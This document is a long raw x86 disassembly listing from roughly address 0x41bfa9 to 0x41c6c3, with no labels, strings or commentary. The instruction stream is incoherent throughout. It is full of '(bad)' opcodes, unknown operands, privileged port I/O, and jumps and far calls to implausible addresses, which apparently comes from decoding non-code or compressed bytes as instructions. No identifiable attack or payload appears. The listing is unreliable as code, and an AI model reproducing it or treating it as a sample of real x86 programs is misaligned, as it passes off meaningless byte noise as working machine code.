  41bfa9:	jmp    0x41bf62
  41bfab:	in     al,dx
  41bfac:	xor    dl,BYTE PTR [esi-0x50]
  41bfaf:	pop    eax
  41bfb0:	adc    BYTE PTR [ebx],bh
  41bfb2:	mov    WORD PTR [ecx],?
  41bfb4:	xor    al,0x28
  41bfb6:	xchg   bh,ah
  41bfb8:	imul   ebx,DWORD PTR [ebx+ecx*1-0x50935c53],0x7e
  41bfc0:	and    BYTE PTR [ecx+0x2],ah
  41bfc3:	jl     0x41bfdc
  41bfc5:	and    ch,0xb4
  41bfc8:	mov    ds:0xe4e35486,al
  41bfcd:	cmp    eax,0x46e95bfc
  41bfd2:	out    dx,eax
  41bfd3:	rcr    bl,0x74
  41bfd6:	add    al,0x4
  41bfd8:	add    eax,0xf220fb4e
  41bfdd:	sbb    al,ah
  41bfdf:	adc    eax,0x706d80c5
  41bfe4:	xor    DWORD PTR [edx+0x6b],edx
  41bfe7:	sub    DWORD PTR [eax],ebx
  41bfe9:	jmp    0x436cc78a
  41bfee:	(bad)  [edi+0x5b]
  41bff1:	adc    esp,ebp
  41bff3:	ja     0x41bfb7
  41bff5:	ds inc esp
  41bff7:	jg     0x41bfd4
  41bff9:	pop    ebp
  41bffa:	loop   0x41c023
  41bffc:	ds addr16 pop ebx
  41bfff:	leave  
  41c000:	jle    0x41c01b
  41c002:	aaa    
  41c003:	in     eax,0xb5
  41c005:	mov    al,0xbd
  41c007:	sbb    BYTE PTR [edx+0xb],dl
  41c00a:	xchg   edx,eax
  41c00b:	adc    ebp,DWORD PTR [edi-0x5c1e252c]
  41c011:	in     eax,0x28
  41c013:	mov    ch,bl
  41c015:	sar    BYTE PTR [ebx-0x77],cl
  41c018:	or     al,ah
  41c01a:	sbb    al,0x7a
  41c01c:	das    
  41c01d:	call   0x8376f845
  41c022:	pop    eax
  41c023:	rol    DWORD PTR [ebp+0x4165a8cc],1
  41c029:	loope  0x41bfac
  41c02b:	js     0x41bfcd
  41c02d:	inc    eax
  41c02e:	inc    BYTE PTR [ecx]
  41c030:	dec    ebx
  41c031:	cwde   
  41c032:	push   esi
  41c033:	neg    DWORD PTR [ebp*4+0x116cdf0c]
  41c03a:	xchg   esi,eax
  41c03b:	adc    bl,bh
  41c03d:	(bad)  [eax]
  41c03f:	ret    0xab01
  41c042:	bound  esi,QWORD PTR [bx+di+0x12]
  41c046:	fistp  DWORD PTR [edi]
  41c048:	test   bl,0xcc
  41c04b:	mov    ebx,DWORD PTR [ecx]
  41c04d:	iret   
  41c04e:	xor    DWORD PTR [esi-0x1d0596f6],esi
  41c054:	jl     0x41c043
  41c056:	add    eax,0x143f2840
  41c05b:	pushf  
  41c05c:	pop    ecx
  41c05d:	aad    0x85
  41c05f:	xchg   ecx,eax
  41c060:	cmp    bl,BYTE PTR [ecx]
  41c062:	ror    DWORD PTR [edi-0x27],0x4d
  41c066:	cld    
  41c067:	jmp    0xa0413f86
  41c06c:	push   esp
  41c06d:	fidiv  DWORD PTR [ebp-0x63]
  41c070:	pop    esi
  41c071:	and    al,0xe7
  41c073:	les    eax,FWORD PTR [eax+0x727245e0]
  41c079:	adc    al,0xc9
  41c07b:	mov    edi,0x99800f6b
  41c080:	jecxz  0x41c052
  41c082:	cmp    DWORD PTR [eax+0xe],0x511969de
  41c089:	or     BYTE PTR ds:0xefb564dd,cl
  41c08f:	enter  0xbda3,0x81
  41c093:	cmp    ebp,DWORD PTR [edx+edx*4-0xd]
  41c097:	pop    es
  41c098:	push   ecx
  41c099:	(bad)  
  41c09a:	jle    0x41c0e0
  41c09c:	cwde   
  41c09d:	scas   eax,DWORD PTR es:[edi]
  41c09e:	aaa    
  41c09f:	or     DWORD PTR ds:0xbb982365,ecx
  41c0a5:	test   DWORD PTR [ecx],ebx
  41c0a7:	aaa    
  41c0a8:	(bad)  
  41c0a9:	in     al,dx
  41c0aa:	retf   
  41c0ab:	push   0x24609c2f
  41c0b0:	int    0x64
  41c0b2:	(bad)  
  41c0b3:	push   edx
  41c0b4:	fucom  st(2)
  41c0b6:	jno    0x41c10d
  41c0b8:	outs   dx,DWORD PTR ds:[esi]
  41c0b9:	jp     0x41c08b
  41c0bb:	cmp    bl,BYTE PTR [ebp+0xe]
  41c0be:	and    DWORD PTR [edx+eiz*2+0x3ece3811],esi
  41c0c5:	cmp    DWORD PTR [ecx-0x50],esp
  41c0c8:	popf   
  41c0c9:	xor    esi,ecx
  41c0cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0cc:	inc    ecx
  41c0cd:	cmp    al,0x7c
  41c0cf:	add    DWORD PTR [ebp-0x5fc9b3d7],ecx
  41c0d5:	enter  0xadd6,0x2e
  41c0d9:	sbb    BYTE PTR [edx],bh
  41c0db:	jmp    FWORD PTR [edi+0x3d]
  41c0de:	add    ecx,DWORD PTR [eax]
  41c0e0:	(bad)  
  41c0e1:	jmp    0x41c13a
  41c0e3:	or     al,0x80
  41c0e5:	out    dx,al
  41c0e6:	pop    ecx
  41c0e7:	nop
  41c0e8:	push   edi
  41c0e9:	mov    al,0x59
  41c0eb:	dec    eax
  41c0ec:	push   cs
  41c0ed:	arpl   WORD PTR [edx-0x1a],si
  41c0f0:	jp     0x41c0c6
  41c0f2:	neg    DWORD PTR [eax+0x1f]
  41c0f5:	sub    al,0x4d
  41c0f7:	retf   
  41c0f8:	rcr    dl,1
  41c0fa:	mov    eax,ds:0xf802b1a4
  41c0ff:	push   eax
  41c100:	fwait
  41c101:	push   ss
  41c102:	pop    ecx
  41c103:	mov    ah,dl
  41c105:	push   edx
  41c106:	icebp  
  41c107:	mov    ?,WORD PTR [ebx]
  41c109:	call   0xed065eb6
  41c10e:	jecxz  0x41c146
  41c110:	dec    edx
  41c111:	pop    es
  41c112:	fwait
  41c113:	push   es
  41c114:	enter  0x334a,0x6d
  41c118:	cdq    
  41c119:	or     ebp,DWORD PTR [edx-0x6d85d50d]
  41c11f:	jle    0x41c0fa
  41c121:	ja     0x41c0c4
  41c123:	adc    al,0x2
  41c125:	popa   
  41c126:	push   esi
  41c127:	mov    ecx,0x84d57e15
  41c12c:	les    esp,FWORD PTR [ecx-0x32d1df0c]
  41c132:	xchg   esi,eax
  41c133:	jg     0x41c186
  41c135:	ja     0x41c149
  41c137:	pop    eax
  41c138:	mov    ds:0x294c5601,al
  41c13d:	dec    edx
  41c13e:	scas   eax,DWORD PTR es:[edi]
  41c13f:	adc    ch,BYTE PTR [ebx+0x6d]
  41c142:	xor    eax,edi
  41c144:	and    dh,BYTE PTR [edx+0x69]
  41c147:	dec    ebp
  41c148:	out    0x22,al
  41c14a:	inc    esi
  41c14b:	shr    BYTE PTR [edi-0x14],cl
  41c14e:	test   BYTE PTR [ecx-0x5989d8cd],cl
  41c154:	aad    0xb5
  41c156:	mov    DWORD PTR [ebp+0xf],esi
  41c159:	mov    al,0x95
  41c15b:	xchg   cl,ah
  41c15d:	jp     0x41c110
  41c15f:	ret    
  41c160:	pop    eax
  41c161:	pop    ebx
  41c162:	(bad)  
  41c163:	stos   DWORD PTR es:[edi],eax
  41c164:	test   al,0xf0
  41c166:	push   ecx
  41c167:	leave  
  41c168:	mov    bh,0xcf
  41c16b:	dec    ebx
  41c16c:	add    eax,0x47d98333
  41c171:	test   BYTE PTR [ebp+0x78],dh
  41c174:	retf   0x8d45
  41c177:	retf   0xb0e3
  41c17a:	and    eax,0x149330a5
  41c17f:	mov    al,ds:0x312feaa8
  41c184:	inc    ebx
  41c185:	in     eax,dx
  41c186:	add    al,0x7a
  41c188:	mov    edi,0x48e3e9c4
  41c18d:	sar    BYTE PTR [ebp+0x28c7015d],cl
  41c193:	sub    bh,bl
  41c195:	jmp    0x1d5b3e06
  41c19a:	dec    eax
  41c19b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c19c:	stc    
  41c19d:	inc    ecx
  41c19e:	xor    DWORD PTR [ebp+0x1c30abfd],ebx
  41c1a4:	aas    
  41c1a5:	pop    eax
  41c1a6:	jp     0x41c16a
  41c1a8:	lods   eax,DWORD PTR ds:[esi]
  41c1a9:	mov    ebp,0x17105c9a
  41c1ae:	jno    0x41c1f2
  41c1b0:	and    BYTE PTR [edx],al
  41c1b2:	mov    al,bh
  41c1b4:	jmp    0x7ee99d4d
  41c1b9:	mov    ds:0x674586,eax
  41c1be:	sub    esp,DWORD PTR [edi+0x76]
  41c1c1:	or     BYTE PTR [edx+edi*2+0x2a],ah
  41c1c5:	lock sbb edx,DWORD PTR [eax]
  41c1c8:	jmp    0x41c163
  41c1ca:	sbb    DWORD PTR [eax+0x8],esp
  41c1cd:	jb     0x41c1c2
  41c1cf:	mul    BYTE PTR [ecx]
  41c1d1:	stc    
  41c1d2:	loopne 0x41c1b5
  41c1d4:	sub    eax,0x38015201
  41c1d9:	pop    ebx
  41c1da:	scas   eax,DWORD PTR es:[edi]
  41c1db:	add    BYTE PTR [esp+ebp*8+0x7f],ah
  41c1df:	mov    edx,0x41f8fec
  41c1e4:	addr16 dec esp
  41c1e7:	mov    al,ds:0x974c6c30
  41c1ec:	mov    ?,WORD PTR [ebp+esi*1-0x706e3d0b]
  41c1f3:	xor    dl,BYTE PTR [ebp-0x453472f9]
  41c1f9:	je     0x41c190
  41c1fb:	pop    edi
  41c1fc:	dec    ebx
  41c1fd:	leave  
  41c1fe:	jl     0x41c180
  41c200:	sahf   
  41c201:	pushf  
  41c202:	in     eax,dx
  41c203:	dec    ebp
  41c204:	pop    esp
  41c205:	push   ss
  41c206:	mov    WORD PTR [eax],ss
  41c208:	xchg   esi,eax
  41c209:	push   esp
  41c20a:	inc    ebp
  41c20b:	or     dh,ch
  41c20d:	and    al,0x8b
  41c20f:	pop    ss
  41c210:	rcr    edx,cl
  41c212:	test   eax,0xd9fd12be
  41c217:	inc    edi
  41c218:	repz push es
  41c21a:	sti    
  41c21b:	mov    es,WORD PTR [eax]
  41c21d:	retf   0x84ed
  41c220:	and    BYTE PTR [ebx+0x53],ah
  41c223:	or     BYTE PTR [esi+0x4],bh
  41c226:	in     eax,0xb6
  41c228:	enter  0x66bf,0x27
  41c22c:	shl    ebp,cl
  41c22e:	fcomp  QWORD PTR [edi+eiz*1]
  41c231:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c232:	mov    eax,ds:0x2926495c
  41c237:	imul   ebp,DWORD PTR [ebx+0x1cbeb81a],0x7d
  41c23e:	cld    
  41c23f:	sahf   
  41c240:	xchg   ebx,eax
  41c241:	sahf   
  41c242:	cmp    dh,BYTE PTR [esi]
  41c244:	fld    TBYTE PTR [ebx-0x23]
  41c247:	push   ebp
  41c248:	mov    eax,ds:0xf09584e7
  41c24d:	sub    al,0x3e
  41c24f:	jl     0x41c2a5
  41c251:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c252:	lock cmc 
  41c254:	les    esp,FWORD PTR [esi+0x2c]
  41c257:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c258:	cmc    
  41c259:	mov    esp,0xe36e0931
  41c25e:	into   
  41c25f:	pop    edx
  41c260:	adc    al,0xcc
  41c262:	daa    
  41c263:	cmp    eax,0xcaf20cef
  41c268:	add    al,0x74
  41c26a:	and    eax,0x74d23d18
  41c26f:	xlat   BYTE PTR ds:[ebx]
  41c270:	aaa    
  41c271:	shr    eax,1
  41c273:	and    BYTE PTR [edx],0x7b
  41c276:	mov    edi,0xc6119613
  41c27b:	shl    DWORD PTR [eax],cl
  41c27d:	sub    ebp,0xa5cb81e6
  41c283:	fisub  DWORD PTR [esi-0x56]
  41c286:	enter  0x666c,0xa8
  41c28a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c28b:	xlat   BYTE PTR ds:[ebx]
  41c28c:	inc    ebp
  41c28d:	ret    0xad57
  41c290:	adc    DWORD PTR [esi],ecx
  41c292:	and    bl,BYTE PTR [ebx+0x5]
  41c295:	push   ebp
  41c296:	dec    esi
  41c297:	icebp  
  41c298:	and    eax,DWORD PTR [edx+0x305fd6ae]
  41c29e:	ins    BYTE PTR es:[edi],dx
  41c29f:	in     eax,0xcc
  41c2a1:	inc    ecx
  41c2a2:	cli    
  41c2a3:	cmp    al,0x87
  41c2a5:	jnp    0x41c2fc
  41c2a7:	push   esi
  41c2a8:	cld    
  41c2a9:	hlt    
  41c2aa:	push   es
  41c2ab:	call   0x563:0xf762c01
  41c2b2:	sbb    DWORD PTR ds:0x76f70ab7,ebp
  41c2b8:	add    ebp,DWORD PTR [ebx-0x1d]
  41c2bb:	add    al,0x2d
  41c2bd:	aad    0x7
  41c2bf:	loopne 0x41c280
  41c2c1:	or     dh,dh
  41c2c3:	xor    edx,DWORD PTR [esi]
  41c2c5:	test   eax,0xf2096982
  41c2ca:	shl    DWORD PTR [eax+eiz*8+0xcfd28a2],0xff
  41c2d2:	add    edx,esi
  41c2d4:	ret    
  41c2d5:	inc    ebx
  41c2d6:	dec    edi
  41c2d7:	mov    dh,0xfd
  41c2d9:	sti    
  41c2da:	and    ebx,ebp
  41c2dc:	inc    DWORD PTR [ecx+0x3e120f1a]
  41c2e2:	out    dx,al
  41c2e3:	(bad)  
  41c2e4:	xor    ch,BYTE PTR [edx]
  41c2e6:	mov    bl,0x7
  41c2e8:	fild   WORD PTR [esi-0x3b]
  41c2eb:	inc    ebp
  41c2ec:	(bad)  
  41c2f0:	adc    DWORD PTR [esi],ebx
  41c2f2:	and    esp,DWORD PTR [edi+0x2]
  41c2f5:	imul   eax,DWORD PTR [ebx],0xffffffd9
  41c2f8:	mov    al,ds:0x90c13e1b
  41c2fd:	pop    ebx
  41c2fe:	cwde   
  41c2ff:	scas   al,BYTE PTR es:[edi]
  41c300:	pushf  
  41c301:	or     al,0xad
  41c303:	lds    esi,FWORD PTR [ebx-0x65f087ec]
  41c309:	cld    
  41c30a:	dec    edi
  41c30b:	test   al,0x5
  41c30d:	jb     0x41c2cb
  41c30f:	jns    0x41c2ab
  41c311:	pop    edi
  41c312:	rol    DWORD PTR [ebx],cl
  41c314:	sub    al,0xd5
  41c316:	cdq    
  41c317:	ins    BYTE PTR es:[edi],dx
  41c318:	dec    edi
  41c319:	popa   
  41c31a:	aad    0x6e
  41c31c:	in     al,dx
  41c31d:	(bad)
  41c320:	pop    ss
  41c321:	mov    ds:0x2bdc19ca,al
  41c326:	fidivr WORD PTR [ecx]
  41c328:	dec    esp
  41c329:	sbb    bh,cl
  41c32b:	sub    al,0x46
  41c32d:	xlat   BYTE PTR ds:[ebx]
  41c32e:	jmp    edi
  41c330:	mov    eax,0x7cebf223
  41c335:	nop
  41c336:	xchg   esp,eax
  41c337:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c338:	std    
  41c339:	inc    esi
  41c33a:	data16 (bad) [ecx-0x17]
  41c33e:	enter  0x5480,0x7c
  41c342:	add    dh,BYTE PTR [edx+0x39]
  41c345:	inc    edi
  41c346:	aad    0x9b
  41c348:	and    al,0xdd
  41c34a:	dec    edi
  41c34b:	or     ch,BYTE PTR [edi+0x3a76ab3d]
  41c351:	das    
  41c352:	aas    
  41c353:	mov    bl,0x9d
  41c355:	push   ebp
  41c356:	(bad)  
  41c357:	aad    0x51
  41c359:	stc    
  41c35a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c35b:	shr    DWORD PTR [ebx],1
  41c35d:	dec    ebp
  41c35e:	shl    DWORD PTR [esi-0x57],0xd1
  41c362:	js     0x41c37e
  41c364:	adc    esp,esp
  41c366:	add    eax,0x2d062a0c
  41c36b:	retf   
  41c36c:	data16 je 0x41c34a
  41c36f:	inc    edi
  41c370:	shl    BYTE PTR [edi+0x5b0edff1],0xf9
  41c377:	(bad)
  41c37a:	jne    0x41c3cc
  41c37c:	cli    
  41c37d:	in     al,0xb2
  41c37f:	(bad)  [eax+0xefe406b]
  41c385:	fs pop esi
  41c387:	gs xchg ebp,eax
  41c389:	adc    ecx,DWORD PTR [esi-0x36]
  41c38c:	mov    BYTE PTR [ebp-0x1f3b3799],bl
  41c392:	xor    BYTE PTR [edi-0x1a],cl
  41c395:	js     0x41c379
  41c397:	xchg   BYTE PTR [ebx],al
  41c399:	mov    dl,0xaa
  41c39b:	jne    0x41c331
  41c39d:	push   0xffffffe4
  41c39f:	mov    BYTE PTR [esi+0x4a861934],0x74
  41c3a6:	sub    al,0x4a
  41c3a8:	mov    ?,ebx
  41c3aa:	xor    esp,DWORD PTR [bp+di]
  41c3ad:	pop    es
  41c3ae:	inc    ebx
  41c3af:	xchg   eax,esi
  41c3b1:	mov    WORD PTR [ebp+ebp*4+0x662ee49f],ds
  41c3b8:	in     eax,0x3
  41c3ba:	push   ebp
  41c3bb:	fldenv [ebx-0x3d1f510]
  41c3c1:	jmp    0x42653b
  41c3c6:	fild   QWORD PTR [edi-0x45e86a6d]
  41c3cc:	sub    dl,BYTE PTR [esi+0x5f]
  41c3cf:	int3   
  41c3d0:	sub    al,0x5b
  41c3d2:	lods   al,BYTE PTR ds:[esi]
  41c3d3:	inc    BYTE PTR [esi+edi*1+0x29]
  41c3d7:	scas   eax,DWORD PTR es:[edi]
  41c3d8:	ins    DWORD PTR es:[edi],dx
  41c3d9:	dec    ebx
  41c3da:	pop    ebx
  41c3db:	dec    edi
  41c3dc:	jle    0x41c3ae
  41c3de:	test   al,0x2a
  41c3e0:	ins    BYTE PTR es:[edi],dx
  41c3e1:	jge    0x41c404
  41c3e3:	mov    dl,0x88
  41c3e5:	cmp    al,0x80
  41c3e7:	das    
  41c3e8:	pop    es
  41c3e9:	jg     0x41c3cc
  41c3eb:	repnz mov bl,0xdc
  41c3ee:	loop   0x41c449
  41c3f0:	dec    ebp
  41c3f1:	pop    ds
  41c3f2:	mov    al,ds:0x1f1d000
  41c3f7:	call   0xa70d:0x368aa627
  41c3fe:	cmp    edx,esp
  41c400:	call   0x1bebdf2a
  41c405:	in     eax,0xa6
  41c407:	mov    eax,0xdd91d285
  41c40c:	call   0x8d5fe59f
  41c411:	pop    eax
  41c412:	sub    BYTE PTR [eax-0x6c],ch
  41c415:	push   ss
  41c416:	push   ecx
  41c417:	pop    ss
  41c418:	ins    DWORD PTR es:[edi],dx
  41c419:	mov    ebx,0xd935affc
  41c41e:	out    0xc1,eax
  41c420:	adc    ah,BYTE PTR [edx-0x9]
  41c423:	ins    BYTE PTR es:[edi],dx
  41c424:	adc    DWORD PTR [esp+esi*4],esi
  41c427:	xchg   ebx,eax
  41c428:	cli    
  41c429:	scas   al,BYTE PTR es:[edi]
  41c42a:	jne    0x41c494
  41c42c:	xchg   ebx,eax
  41c42d:	xchg   BYTE PTR [ecx+0x2d9f205],bh
  41c433:	inc    esi
  41c434:	xor    BYTE PTR [ebp+0x15],0xa9
  41c438:	add    al,BYTE PTR [eax+0x7f]
  41c43b:	push   eax
  41c43c:	xchg   esi,eax
  41c43d:	sub    al,0x25
  41c43f:	les    ebp,FWORD PTR [esi]
  41c441:	aas    
  41c442:	mov    cl,0xba
  41c444:	pop    ss
  41c445:	inc    edx
  41c446:	pop    edi
  41c447:	stos   BYTE PTR es:[edi],al
  41c448:	mov    bl,0x6e
  41c44a:	ja     0x41c491
  41c44c:	cmp    cl,bh
  41c44e:	xor    eax,DWORD PTR [esi-0x8d7e8ef]
  41c454:	rcl    BYTE PTR [edi-0x7],0x20
  41c458:	push   0x6
  41c45a:	dec    ebx
  41c45b:	je     0x41c3fd
  41c45d:	retf   
  41c45e:	pop    edi
  41c45f:	mov    al,ds:0x19536ebc
  41c464:	in     eax,dx
  41c465:	inc    esi
  41c466:	adc    dl,BYTE PTR [edx]
  41c468:	pop    ecx
  41c469:	dec    edi
  41c46a:	(bad)  [ecx+esi*2]
  41c46d:	dec    ecx
  41c46e:	fwait
  41c46f:	aas    
  41c470:	jae    0x41c4c5
  41c472:	xor    BYTE PTR [ecx+ebp*4-0x4b],bl
  41c476:	pop    eax
  41c477:	adc    DWORD PTR [ebp-0x4d],edx
  41c47a:	sbb    bl,ah
  41c47c:	adc    BYTE PTR ds:0xb8c6d384,dl
  41c482:	and    eax,0x3487d20
  41c487:	sub    al,0x96
  41c489:	xor    BYTE PTR [edx-0xa6ffcb5],bl
  41c48f:	or     eax,0xbb18561c
  41c494:	mov    dl,0x71
  41c496:	lea    edi,[ebp-0x22]
  41c499:	ja     0x41c434
  41c49b:	adc    eax,0x3f6433ac
  41c4a0:	sub    eax,0xe42d6c31
  41c4a5:	inc    edi
  41c4a6:	cdq    
  41c4a7:	add    DWORD PTR [edx],esp
  41c4a9:	push   ds
  41c4aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c4ab:	pop    edx
  41c4ac:	jl     0x41c521
  41c4ae:	mov    BYTE PTR [bp+di+0x70],dh
  41c4b2:	into   
  41c4b3:	mov    ds:0x4d64408d,eax
  41c4b8:	xchg   ebx,eax
  41c4b9:	call   0x3a0f0518
  41c4be:	sbb    al,0x6a
  41c4c0:	fsubr  DWORD PTR [eax]
  41c4c2:	loop   0x41c51e
  41c4c4:	sub    al,0xa3
  41c4c6:	(bad)  
  41c4c7:	push   ds
  41c4c8:	and    eax,0x6d6d4064
  41c4cd:	sub    ecx,edi
  41c4cf:	mov    eax,0xa34b577a
  41c4d4:	lock inc ebx
  41c4d6:	push   eax
  41c4d7:	jno    0x41c4d3
  41c4d9:	fldenv [ecx-0x15]
  41c4dc:	sahf   
  41c4dd:	fnsave [esi]
  41c4df:	shl    BYTE PTR [ebp+0x7024464],cl
  41c4e5:	pop    esp
  41c4e6:	mov    eax,0x866e58f0
  41c4eb:	cmc    
  41c4ec:	enter  0x226c,0x95
  41c4f0:	nop
  41c4f1:	es daa 
  41c4f3:	out    0x15,eax
  41c4f5:	enter  0xeeaa,0x9c
  41c4f9:	sbb    edx,DWORD PTR [edi]
  41c4fb:	inc    esi
  41c4fc:	fiadd  WORD PTR [edi]
  41c4fe:	ins    DWORD PTR es:[edi],dx
  41c4ff:	shr    esp,cl
  41c501:	pop    gs
  41c503:	xchg   edx,eax
  41c504:	sti    
  41c505:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c506:	push   esi
  41c507:	ins    BYTE PTR es:[edi],dx
  41c508:	adc    dl,dh
  41c50a:	pop    esp
  41c50b:	adc    eax,0xc63194d4
  41c510:	inc    ebp
  41c511:	adc    BYTE PTR [edi],cl
  41c513:	aaa    
  41c514:	cwde   
  41c515:	aas    
  41c516:	dec    ecx
  41c517:	cdq    
  41c518:	xlat   BYTE PTR ds:[ebx]
  41c519:	ja     0x41c4c2
  41c51b:	rcr    DWORD PTR ds:0xddff070c,cl
  41c521:	mul    ebx
  41c523:	dec    BYTE PTR [ecx+0x4eb75721]
  41c529:	pushf  
  41c52a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c52b:	mov    DWORD PTR ds:0xacfac978,esp
  41c531:	adc    DWORD PTR [esi-0x19],esi
  41c534:	lods   al,BYTE PTR ds:[esi]
  41c535:	int    0x81
  41c537:	xchg   ebx,eax
  41c538:	popf   
  41c539:	sub    ebp,DWORD PTR [eax]
  41c53b:	sbb    DWORD PTR [edx-0x59],edx
  41c53e:	test   DWORD PTR fs:[esp+eax*8],eax
  41c542:	daa    
  41c543:	jnp    0x41c57e
  41c545:	in     eax,0xb3
  41c547:	push   edx
  41c548:	js     0x41c58f
  41c54a:	ins    DWORD PTR es:[edi],dx
  41c54b:	sub    esp,DWORD PTR [ebx]
  41c54d:	dec    ecx
  41c54e:	scas   al,BYTE PTR es:[edi]
  41c54f:	jbe    0x41c4e0
  41c551:	xchg   edx,eax
  41c552:	xor    BYTE PTR [esi],ch
  41c554:	dec    ecx
  41c555:	hlt    
  41c556:	data16 adc BYTE PTR [edi+ebx*2-0x2],0xf
  41c55c:	outs   dx,DWORD PTR ds:[esi]
  41c55d:	mov    bh,BYTE PTR [ebx+0x54]
  41c560:	sti    
  41c561:	xchg   DWORD PTR [ebx],ebx
  41c563:	or     dl,BYTE PTR [ebp+0x19]
  41c566:	call   0xce00:0x399ddfbf
  41c56d:	loopne 0x41c5bb
  41c56f:	popf   
  41c570:	xchg   ecx,eax
  41c571:	jl     0x41c57d
  41c573:	adc    ah,BYTE PTR [ecx-0x80]
  41c576:	sbb    dl,BYTE PTR [ecx-0x133a6200]
  41c57c:	stos   DWORD PTR es:[edi],eax
  41c57d:	sbb    eax,0x2ec69e8e
  41c582:	jns    0x41c55b
  41c584:	mov    dh,0xc2
  41c586:	cmp    edi,DWORD PTR [ecx]
  41c588:	loopne 0x41c591
  41c58a:	in     al,dx
  41c58b:	mov    ebx,0x976798a9
  41c590:	sbb    BYTE PTR [edx-0x75],0xe3
  41c594:	xor    eax,0xf41b8294
  41c599:	jmp    0x41c5f4
  41c59b:	pop    ecx
  41c59c:	cmp    al,0xae
  41c59e:	stc    
  41c59f:	sti    
  41c5a0:	(bad)  
  41c5a1:	xchg   ebp,eax
  41c5a2:	push   eax
  41c5a3:	cmp    esi,esi
  41c5a5:	lods   al,BYTE PTR ds:[esi]
  41c5a6:	jns    0x41c53e
  41c5a8:	js     0x41c58d
  41c5aa:	mov    dh,0xa7
  41c5ad:	dec    esp
  41c5ae:	(bad)  
  41c5af:	and    ecx,DWORD PTR [esi+esi*1-0x6a]
  41c5b3:	fsub   QWORD PTR [ebx]
  41c5b5:	mov    DWORD PTR [edx+0x101329df],esi
  41c5bb:	jne    0x41c605
  41c5bd:	sbb    di,WORD PTR [eax+0x6f7bc67c]
  41c5c4:	adc    DWORD PTR [eiz*2+0x74b41046],ebp
  41c5cb:	int    0x80
  41c5cd:	(bad)  
  41c5ce:	ins    BYTE PTR es:[edi],dx
  41c5cf:	xlat   BYTE PTR ds:[ebx]
  41c5d0:	ds sub al,0xca
  41c5d3:	mov    ?,WORD PTR [ebp+0x36]
  41c5d6:	popf   
  41c5d7:	ret    0xf307
  41c5da:	inc    esi
  41c5db:	rol    DWORD PTR [ecx-0x45497b07],cl
  41c5e1:	sbb    edi,DWORD PTR [ebp+0x69]
  41c5e4:	mov    dh,0xfc
  41c5e6:	pushf  
  41c5e7:	mov    al,0x38
  41c5e9:	mov    esi,0x5db669f6
  41c5ee:	push   edx
  41c5ef:	cmp    al,0x3b
  41c5f1:	ins    DWORD PTR es:[edi],dx
  41c5f2:	imul   edx,DWORD PTR [ebx+0x59818895],0x34
  41c5f9:	mov    dl,0x50
  41c5fb:	xchg   ecx,eax
  41c5fc:	ss jecxz 0x41c5e7
  41c5ff:	xor    bh,BYTE PTR [ecx]
  41c601:	mov    ds:0x4743f616,al
  41c606:	fcomp  DWORD PTR [edx+eiz*1]
  41c609:	inc    esp
  41c60a:	outs   dx,BYTE PTR ds:[esi]
  41c60b:	ins    DWORD PTR es:[edi],dx
  41c60c:	dec    esi
  41c60d:	(bad)  
  41c60e:	sub    BYTE PTR [edx-0x12883e1d],dl
  41c614:	jno    0x41c631
  41c616:	ins    BYTE PTR es:[edi],dx
  41c617:	dec    esp
  41c618:	ins    BYTE PTR es:[edi],dx
  41c619:	jmp    0x41c651
  41c61b:	xor    BYTE PTR [edi],ah
  41c61d:	jmp    0x49eb1d26
  41c622:	sti    
  41c623:	cdq    
  41c624:	adc    bl,BYTE PTR [edi]
  41c626:	mov    dh,0x3c
  41c628:	or     DWORD PTR [eax+0x1e],ebp
  41c62b:	nop
  41c62c:	or     al,0x2e
  41c62e:	adc    DWORD PTR [ecx*1-0x6b3d7da9],esi
  41c635:	jp     0x41c6a0
  41c637:	jns    0x41c677
  41c639:	push   ecx
  41c63a:	sub    BYTE PTR [edx+0x653072bd],dl
  41c640:	and    edi,DWORD PTR [esi]
  41c642:	mov    ebx,0x9b91f4f9
  41c647:	xchg   esi,eax
  41c648:	add    esp,DWORD PTR [edi-0x67]
  41c64b:	pop    ds
  41c64c:	xor    eax,edx
  41c64e:	test   DWORD PTR [edi],edx
  41c650:	gs gs cmp eax,0x1f3f7d97
  41c657:	push   ecx
  41c658:	sar    BYTE PTR [ebx+0x3c],1
  41c65b:	adc    ebx,ebp
  41c65d:	int3   
  41c65e:	ret    0x8e80
  41c661:	jbe    0x41c62c
  41c663:	cld    
  41c664:	repz inc ax
  41c667:	jmp    0xc3752927
  41c66c:	jne    0x41c5f7
  41c66e:	sti    
  41c66f:	psubb  mm4,QWORD PTR [eax]
  41c672:	bnd ret 0xa71b
  41c676:	scas   al,BYTE PTR es:[edi]
  41c677:	xchg   esp,eax
  41c678:	xlat   BYTE PTR ds:[ebx]
  41c679:	fdiv   st,st(1)
  41c67b:	test   al,0x5a
  41c67d:	es cwde 
  41c67f:	xchg   ecx,eax
  41c680:	call   0x5ea6029d
  41c685:	nop
  41c686:	pop    edx
  41c687:	cmp    esi,DWORD PTR [eax+0x218109c7]
  41c68d:	pop    edi
  41c68e:	jmp    0x6f11:0xad4ba1bc
  41c695:	jg     0x41c61e
  41c697:	add    edx,DWORD PTR [eax-0x200a8270]
  41c69d:	and    BYTE PTR [eax-0x58edeedc],bh
  41c6a3:	popf   
  41c6a4:	(bad)  
  41c6a5:	fwait
  41c6a6:	dec    esp
  41c6a7:	sub    DWORD PTR [eax],edi
  41c6a9:	jle    0x41c709
  41c6ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6ac:	(bad)  
  41c6ad:	(bad)  
  41c6ae:	lahf   
  41c6af:	out    dx,eax
  41c6b0:	in     eax,0xe7
  41c6b2:	push   eax
  41c6b3:	push   cs
  41c6b4:	outs   dx,BYTE PTR ss:[esi]
  41c6b6:	jb     0x41c6d9
  41c6b8:	xor    eax,0x1eb4a53e
  41c6bd:	cmp    al,0x10
  41c6bf:	xor    ch,bl
  41c6c1:	daa    
  41c6c2:	ret    
  41c6c3:	adc    DWORD PTR [ebx+0x44],0x38f573a9
